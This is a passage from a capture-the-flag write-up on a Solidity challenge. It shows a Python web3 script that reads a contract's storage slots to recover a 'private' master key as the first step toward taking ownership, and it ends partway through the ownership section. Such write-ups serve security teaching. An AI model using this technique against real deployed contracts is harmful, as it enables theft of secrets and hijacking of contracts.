# Inju's Gambit

> Inju owns all the things in the area, waiting for one worthy challenger to emerge.
>  Rumor said, that there many ways from many different angle to tackle Inju.
>  Are you the Challenger worthy to oppose him?

Attached files: [Setup.sol](./source/Setup.sol), [ChallengeManager.sol](./source/ChallengeManager.sol), [Privileged.sol](./source/Privileged.sol)

## Challenge Outline
As usual, the goal of the challenge is to make the isSolved function in the setup contract return true.
```solidity
function isSolved() public view returns(bool){
    return address(privileged.challengeManager()) == address(0);
}
```

## Approach
Our goal is to set the challengeManager address in the privileged contract to the null address (0x000...). I started looking though the Privileged.sol contract for a function that coudl accomplish this. Fortunately, the fireManager functions appears to do just that:
```solidity
function fireManager() public onlyOwner{
    challengeManager = address(0);
}
```
However, to call fireManager, we first need to become the owner of the privileged contract. The current owner is the contract that deployed it: the challenge manager contract. I then reviewed the challenge manager contract for a function that would either allow us to call fireManager or become the owner ourselves.
```solidity
function challengeCurrentOwner(bytes32 _key) public onlyChosenChallenger{
    if(keccak256(abi.encodePacked(_key)) == keccak256(abi.encodePacked(masterKey))){
        privileged.setNewCasinoOwner(address(theChallenger));
    }
}
```
The challengeCurrentOwner function allows us to become the owner if we meet two conditions: being the chosen challenger and having the master key. 
### Obtaining the key
The `bytes32 private masterKey` means that the masterKey is a private variable and we cannot access it externally. Even though it is called private, it is still stored publicly on the blockchain, allowing us to read it from its storage slot. A contract's state variables are stored in storage slots and by reading these slots, we can find the value of the master key.
```python
from web3 import Web3

rpc_url = "http://45.32.119.201:44445/f03fa921-b78f-4d64-87b1-e25a5af93fd1"  # rpc endpoint
w3 = Web3(Web3.HTTPProvider(rpc_url))
if not w3.is_connected():
    print("Couldn't connect")
    exit(1)

def read_slot(address, slot):
    value = w3.eth.get_storage_at(address, slot)
    return value

contract_addr = "0x4635c4064F565f0a5ca43D4893a2a6977F2B2655"  # the address of the challengeManager contract
for x in range(10):
    key = read_slot(contract_addr, x)
    print(x, key, key.hex())
```
This is the Python script I used to read the first ten slots of the contract.
You can determine which slot a certain variable is stored in based on the order they are declared, but I was lazy and decided to just print them all out :P.  
Output:
```
0 b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1f\x92\xa4\x06\xa6i\xaf\xf94\xe2*n\xd5\xcel\xf5|\xa3\x1f5' 0000000000000000000000001f92a406a669aff934e22a6ed5ce6cf57ca31f35
1 b'INJUINJUINJUSUPERKEYKEYKEYKEYKEY' 494e4a55494e4a55494e4a5553555045524b45594b45594b45594b45594b4559
2 b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' 0000000000000000000000000000000000000000000000000000000000000000
3 b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xf8\xcfh>\x96\xae\xe5\x06wow\x06\x97\x86\xaaz\xf0+\x03\x90' 000000000000000000000000f8cf683e96aee506776f77069786aa7af02b0390
4 b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00Ec\x91\x82D\xf4\x00\x00' 0000000000000000000000000000000000000000000000004563918244f40000
```
From the output, I think it is safe to assume that INJUINJUINJUSUPERKEYKEYKEYKEYKEY is our master key.

### Becoming the owner
After looking through the functions in ChallengeManager.sol, I noticed that the only function that would allow us to become the owner was the upgradeChallengerAttribute function. 
